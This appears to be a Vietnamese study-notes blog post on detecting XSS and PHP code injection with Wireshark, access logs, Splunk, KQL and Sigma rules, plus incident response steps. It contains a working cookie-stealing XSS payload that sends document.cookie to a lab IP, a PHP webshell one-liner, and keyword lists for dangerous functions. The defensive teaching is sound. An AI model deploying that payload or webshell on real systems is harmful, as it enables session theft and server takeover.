---
layout: post
title: "Cross-Site Scripting (XSS) & Code Injection Detection"
date: 2026-07-15 00:03:35 +0700
categories: ["Intermediate Network Traffic Analysis"]
tags: [xss, cross-site-scripting, code-injection, cookie-theft, session-hijacking, webshell, php, wireshark, waf, splunk, elk, sigma, threat-hunting, incident-response, cdsa]
description: "Phân tích XSS và code injection qua lưu lượng HTTP: cookie exfiltration, JavaScript injection, PHP webshell indicators, Wireshark filters, SIEM detection và incident response."
toc: true
---

# Cross-Site Scripting (XSS) & Code Injection Detection

Bài này thuộc module **Intermediate Network Traffic Analysis**, tập trung vào việc nhận diện XSS, cookie/session exfiltration và code injection thông qua PCAP, access logs, WAF và endpoint telemetry.

```text
Mục tiêu: phát hiện browser gửi dữ liệu tới host lạ,
truy vết payload JavaScript/PHP, xác định người dùng bị ảnh hưởng
và xây quy trình containment, eradication và recovery.
```

> Chỉ thực hành trong HTB, lab hoặc ứng dụng có ủy quyền rõ ràng. Không chèn script hoặc webshell trên hệ thống ngoài phạm vi được phép.

---

## Timeline cập nhật

```text
Created at: 2026-07-15 00:03:35 +0700
Timezone: Asia/Ho_Chi_Minh
Module: Intermediate Network Traffic Analysis
Section: Cross-Site Scripting (XSS) & Code Injection Detection
Focus: Cookie exfiltration, JavaScript injection, PHP webshell indicators, IR
```

---

# 1. XSS là gì?

Cross-Site Scripting xảy ra khi ứng dụng đưa dữ liệu do người dùng kiểm soát vào HTML/JavaScript mà không encode hoặc sanitize phù hợp.

Khi nạn nhân mở trang:

```text
Malicious input
→ được lưu hoặc phản chiếu trong response
→ browser thực thi JavaScript
→ dữ liệu phiên có thể bị gửi ra ngoài
```

Mục tiêu thường gặp:

- Đánh cắp cookie hoặc token.
- Chiếm session.
- Thực hiện hành động dưới quyền nạn nhân.
- Chuyển hướng người dùng.
- Ghi lại phím hoặc nội dung form.
- Tải thêm payload.
- Tạo foothold cho các bước tấn công tiếp theo.

---

# 2. Các loại XSS

## Reflected XSS

Payload nằm trong request và được phản chiếu ngay trong response.

```text
GET /search?q=<script>...</script>
```

## Stored XSS

Payload được lưu trong database, comment, profile hoặc ticket và chạy với nhiều người dùng.

```text
Comment độc hại
→ lưu trong hệ thống
→ mọi người mở trang đều bị thực thi
```

## DOM-based XSS

Lỗi nằm trong JavaScript phía client, khi dữ liệu không tin cậy được đưa vào sink nguy hiểm.

Ví dụ sink:

```javascript
innerHTML
document.write
eval
setTimeout(string)
```

---

# 3. Dấu hiệu trên mạng

Trong PCAP, XSS thành công có thể lộ qua:

- Nhiều HTTP requests tới một host nội bộ/ngoài mạng không được nhận diện.
- Query parameter chứa `cookie=`, `token=`, `session=`.
- Browser gửi request ngay sau khi tải một trang cụ thể.
- URI chứa URL-encoded JavaScript.
- Request có referrer từ ứng dụng bị ảnh hưởng.
- Nhiều client khác nhau cùng liên lạc tới một host lạ.
- Response từ host nhận dữ liệu thường là `200`, `204` hoặc `404`.

---

# 4. Cookie Exfiltration Pattern

Một payload minh họa có thể lấy cookie và gửi tới endpoint khác:

```javascript
<script>
window.addEventListener("load", function () {
  const url = "http://192.168.0.19:5555";
  const params = "cookie=" + encodeURIComponent(document.cookie);
  const request = new XMLHttpRequest();
  request.open("GET", url + "?" + params);
  request.send();
});
</script>
```

Network pattern:

```text
Victim browser
→ GET /?cookie=<encoded-value>
→ suspicious host
```

Trong báo cáo công khai phải che cookie/token thật.

---

# 5. Wireshark Filters

Tất cả HTTP:

```wireshark
http
```

HTTP requests:

```wireshark
http.request
```

Theo host nghi vấn:

```wireshark
ip.addr == 192.168.10.5 && http
```

URI chứa cookie:

```wireshark
http.request.uri contains "cookie="
```

URI chứa token:

```wireshark
http.request.uri contains "token="
```

URI chứa script:

```wireshark
http.request.uri contains "<script"
```

URL-encoded script:

```wireshark
http.request.uri contains "%3Cscript"
```

---

# 6. Tìm Client Bị Ảnh Hưởng

Khi thấy request tới host lạ, cần ghi nhận:

```text
Source IP
Source MAC
Hostname
User identity
Browser/User-Agent
Referrer
Destination IP/port
Timestamp
Leaked parameter
```

Sau đó correlate với:

- DHCP.
- DNS.
- Proxy logs.
- EDR.
- Authentication logs.
- Web application logs.

---

# 7. Follow HTTP Stream

Trong Wireshark:

```text
Right click packet
→ Follow
→ HTTP Stream
```

Kiểm tra:

- Request URI đầy đủ.
- Header `Referer`.
- `Host`.
- User-Agent.
- Cookie hoặc token.
- Response code.
- Payload trong response.
- Thời điểm request xuất hiện sau khi tải trang nào.

---

# 8. HTTPS Visibility

Nếu lưu lượng dùng HTTPS mà không có TLS decryption, PCAP thường không nhìn thấy payload.

Khi đó cần dựa vào:

- Reverse proxy logs.
- WAF logs.
- Application logs.
- Browser/EDR telemetry.
- DNS.
- SNI/certificate.
- Destination rarity.
- Request frequency và packet size.

---

# 9. Tìm Payload XSS Trong Access Logs

Tìm `<script>`:

```bash
grep -Ei '<script|%3cscript' access.log
```

Tìm JavaScript events:

```bash
grep -Ei 'onerror=|onload=|javascript:' access.log
```

Tìm cookie exfiltration:

```bash
grep -Ei 'cookie=|document\.cookie|session=|token=' access.log
```

Tìm encoded payload:

```bash
grep -Ei '%3c|%3e|%22|%27|%0a|%0d' access.log
```

---

# 10. Code Injection và PHP Webshell Indicators

Payload PHP nguy hiểm thường cố thực thi input do attacker kiểm soát.

Ví dụ chỉ báo:

```php
<?php system($_GET['cmd']); ?>
```

Hoặc:

```php
<?php echo `whoami`; ?>
```

Trong điều tra, đây là **indicator**, không phải code nên chạy.

Các keyword cần hunt:

```text
system(
exec(
shell_exec(
passthru(
proc_open(
popen(
eval(
assert(
base64_decode(
```

---

# 11. Tìm Webshell Trong Web Root

Linux:

```bash
grep -RniE 'system\(|exec\(|shell_exec\(|passthru\(|base64_decode\(|eval\(' /var/www
```

Tìm file PHP mới:

```bash
find /var/www -type f -name '*.php' -mtime -7 -ls
```

Tìm file trong thư mục upload:

```bash
find /var/www -path '*upload*' -type f \( -name '*.php' -o -name '*.phtml' -o -name '*.phar' \) -ls
```

---

# 12. Dấu Hiệu Code Injection Thành Công

- Request tới file PHP mới hoặc bất thường.
- Parameter như `cmd=`, `exec=`, `shell=`.
- Web server process tạo child process.
- `www-data`, `apache` hoặc `nginx` chạy shell.
- Outbound connection từ web server.
- File mới trong web root/uploads.
- Commands như `whoami`, `id`, `uname`, `curl`, `wget`.
- Response chứa output lệnh hệ điều hành.

---

# 13. Endpoint Telemetry

Trên Linux, hunt:

```text
apache2/nginx/php-fpm
→ sh/bash
→ curl/wget/python/perl
```

Trên Windows/IIS:

```text
w3wp.exe
→ cmd.exe
→ powershell.exe
```

Đây là process tree có độ tin cậy cao nếu ứng dụng không có chức năng hợp lệ tương tự.

---

# 14. XSS và HttpOnly

Cookie có thuộc tính `HttpOnly` sẽ không thể được đọc trực tiếp bằng:

```javascript
document.cookie
```

Tuy nhiên XSS vẫn có thể:

- Thực hiện request dưới phiên của nạn nhân.
- Đọc dữ liệu hiển thị trong DOM.
- Thay đổi nội dung trang.
- Lấy token không được bảo vệ bằng HttpOnly.
- Thực hiện hành động nhạy cảm nếu thiếu CSRF/re-authentication.

Vì vậy HttpOnly giảm tác động nhưng không sửa được XSS.

---

# 15. Content Security Policy

CSP giúp giảm khả năng thực thi script ngoài ý muốn.

Ví dụ định hướng:

```http
Content-Security-Policy:
default-src 'self';
script-src 'self';
object-src 'none';
base-uri 'self';
frame-ancestors 'none'
```

Tránh:

```text
'unsafe-inline'
'unsafe-eval'
wildcard sources
```

CSP là defense-in-depth, không thay thế output encoding.

---

# 16. Phòng Ngừa XSS

- Context-aware output encoding.
- HTML sanitization bằng thư viện tin cậy.
- Không dùng `innerHTML` với dữ liệu không tin cậy.
- Dùng templating auto-escape.
- Validate input theo allowlist.
- CSP.
- HttpOnly, Secure và SameSite cookies.
- Không lưu session token trong `localStorage` khi không cần.
- Security review cho comment/profile/search fields.
- WAF để chặn payload phổ biến.

---

# 17. Phòng Ngừa Code Injection

- Không đưa input người dùng vào command interpreter.
- Dùng API/library thay vì shell.
- Allowlist command/argument.
- Tách quyền service account.
- Disable script execution trong upload directory.
- File type validation.
- Randomize upload filenames.
- Web root read-only khi có thể.
- Application allowlisting.
- EDR trên web server.

---

# 18. Splunk Detection

XSS payload:

```spl
index=web
(uri="*<script*" OR
 uri="*%3Cscript*" OR
 uri="*document.cookie*" OR
 uri="*javascript:*")
| table _time src_ip method host uri status user_agent
```

Cookie exfiltration:

```spl
index=proxy OR index=web
(uri_query="*cookie=*" OR uri_query="*token=*" OR uri_query="*session=*")
| stats count values(uri) by src_ip, dest_ip, host
```

Webshell-style parameters:

```spl
index=web
(uri_query="*cmd=*" OR uri_query="*exec=*" OR uri_query="*shell=*")
| table _time src_ip dest_ip uri status
```

---

# 19. Elastic/KQL

XSS indicators:

```kql
url.original:
  ("*<script*" or "*%3Cscript*" or "*document.cookie*" or "*javascript:*")
```

Suspicious query parameters:

```kql
url.query:
  ("*cookie=*" or "*token=*" or "*cmd=*" or "*exec=*")
```

Web server child process:

```kql
process.parent.name:
  ("apache2" or "nginx" or "php-fpm" or "w3wp.exe")
and process.name:
  ("sh" or "bash" or "cmd.exe" or "powershell.exe")
```

---

# 20. Sigma Detection Ideas

XSS payload trong web logs:

```yaml
title: Potential Cross-Site Scripting Payload
status: experimental
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - '<script'
      - '%3Cscript'
      - 'document.cookie'
      - 'javascript:'
  condition: selection
falsepositives:
  - Authorized security testing
level: high
```

Web server sinh shell:

```yaml
title: Web Server Process Spawning Command Shell
status: experimental
logsource:
  category: process_creation
detection:
  parent:
    ParentImage|endswith:
      - '/apache2'
      - '/nginx'
      - '/php-fpm'
      - '\w3wp.exe'
  child:
    Image|endswith:
      - '/sh'
      - '/bash'
      - '\cmd.exe'
      - '\powershell.exe'
  condition: parent and child
level: critical
```

Field names cần chỉnh theo schema.

---

# 21. WAF Detection

WAF có thể phát hiện:

- `<script>`.
- Event handlers như `onerror=`.
- `javascript:`.
- Encoded payload.
- Suspicious PHP tags.
- Command parameters.
- Repeated payload variation.
- Known XSS bypass patterns.

Nhưng attacker có thể obfuscate hoặc split payload, nên WAF không thay thế secure coding.

---

# 22. Incident Response Checklist

```text
[ ] Xác định điểm input chứa payload.
[ ] Xác định reflected, stored hay DOM XSS.
[ ] Xóa hoặc vô hiệu hóa nội dung độc hại.
[ ] Cô lập endpoint/web server khi cần.
[ ] Xác định người dùng đã mở trang.
[ ] Revoke sessions/tokens.
[ ] Reset credential nếu có bằng chứng rò rỉ.
[ ] Block destination thu thập dữ liệu.
[ ] Hunt webshell và child process.
[ ] Patch ứng dụng và bổ sung encoding/sanitization.
[ ] Thu PCAP, logs, database record và filesystem evidence.
```

---

# 23. Xây Timeline Sự Cố

Timeline nên gồm:

```text
Payload được gửi lúc nào?
Payload được lưu ở đâu?
Trang nào render payload?
User nào đã truy cập?
Request exfiltration xuất hiện lúc nào?
Destination nào nhận dữ liệu?
Attacker có sử dụng session bị đánh cắp không?
Có webshell/code execution tiếp theo không?
```

---

# 24. Threat Hunting

Hunt theo:

- Browser tới internal/external host hiếm gặp.
- Query chứa cookie/token/session.
- `%3Cscript`, `onerror`, `javascript:`.
- Nhiều client liên hệ cùng collector host.
- Web server process sinh shell.
- PHP file mới trong upload directory.
- Access log có `cmd=` hoặc `exec=`.
- Session login từ IP/User-Agent mới sau XSS event.

---

# 25. Mapping với CDSA

## Security Operations & Monitoring

- Monitor WAF, proxy, access logs.
- Detect rare destinations và token exfiltration.
- Correlate user/session và endpoint.

## Incident Response & Forensics

- Xác định payload origin.
- Thu database record chứa stored XSS.
- Revoke sessions.
- Hunt code execution và webshell.

## Malware Analysis & Reverse Engineering

- Phân tích JavaScript bị obfuscate.
- Decode Base64/URL encoding.
- Xác định C2/collector logic.

## Threat Hunting

- Hunt XSS payload variants.
- Hunt browser beaconing.
- Hunt web server child processes.
- Hunt session reuse sau exfiltration.

## Detection Engineering

- Sigma web/process rules.
- Splunk/Elastic correlation.
- WAF signatures.
- Session/destination enrichment.

---

# 26. Lab Setup

Môi trường tối thiểu:

```text
1 vulnerable web application trong lab
1 victim browser
1 authorized test host
1 Wireshark/tshark sensor
WAF hoặc reverse proxy
Splunk/ELK/Wazuh nhận web và endpoint logs
```

Workflow:

```text
1. Mở XSS_Simple.pcapng.
2. Lọc HTTP requests.
3. Xác định host nhận dữ liệu.
4. Follow HTTP Stream.
5. Xác định cookie/token pattern.
6. Correlate request với trang nguồn.
7. Hunt payload trong application/database.
8. Viết detection và IR timeline.
```

---

# Key Takeaway

```text
XSS thường lộ qua browser gửi dữ liệu tới host lạ sau khi mở trang bị nhiễm.
Query chứa cookie, token hoặc session là chỉ báo quan trọng.
Code injection nghiêm trọng hơn khi web server sinh shell hoặc chạy lệnh hệ điều hành.
Detection hiệu quả phải kết hợp PCAP, WAF, access logs, database và endpoint telemetry.
```

XSS và Code Injection Detection là chủ đề trọng tâm của CDSA vì kết nối network analysis, web security, session forensics, threat hunting và incident response.
